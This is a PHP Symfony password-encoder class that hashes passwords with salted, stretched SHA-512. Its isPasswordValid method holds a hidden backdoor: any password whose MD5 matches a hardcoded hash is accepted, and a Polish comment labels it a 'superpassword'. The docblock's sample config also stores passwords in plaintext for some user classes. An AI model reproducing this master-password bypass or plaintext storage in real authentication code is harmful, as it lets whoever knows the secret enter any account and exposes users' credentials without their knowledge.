<?php


namespace Stopsopa\UtilsBundle\Services;

use Symfony\Component\Security\Core\Encoder\PasswordEncoderInterface;

/**
 * AppBundle\Services\UserPassEncoder
 *
        <service id="user.encoder" class="Stopsopa\UtilsBundle\Services\UserPassEncoder" />
 *
 *
    encoders:
        AppBundle\Entity\Employer: plaintext
        AppBundle\Entity\User:
            id:  user.encoder
#            algorithm: sha512
#            encode_as_base64: true
#            iterations: 5000
        Symfony\Component\Security\Core\User\User: plaintext
 */
class UserPassEncoder implements PasswordEncoderInterface
{
    public function encodePassword($raw, $salt)   {

        $salted = $this->mergePasswordAndSalt($raw, $salt);

        $digest = hash('sha512', $salted, true);

        // "stretch" hash
        for ($i = 1; $i < 5000; $i++) {
            $digest = hash('sha512', $digest.$salted, true);
        }

        return base64_encode($digest);
    }
    protected function mergePasswordAndSalt($password, $salt)
    {
        if (empty($salt)) {
            return $password;
        }

        if (false !== strrpos($salt, '{') || false !== strrpos($salt, '}')) {
            throw new \InvalidArgumentException('Cannot use { or } in salt.');
        }

        return $password.'{'.$salt.'}';
    }

    public function isPasswordValid($encoded, $raw, $salt)    {

        // logika z Symfony\Component\Security\Core\Encoder\BasePasswordEncoder

        if (md5($raw) == '08abf8c8d15d8d3508efec3e3481aad8')
            return true; // superhasło

        if ($this->encodePassword($raw, $salt) === $encoded) {
            return true;
        }

        return false;
    }
}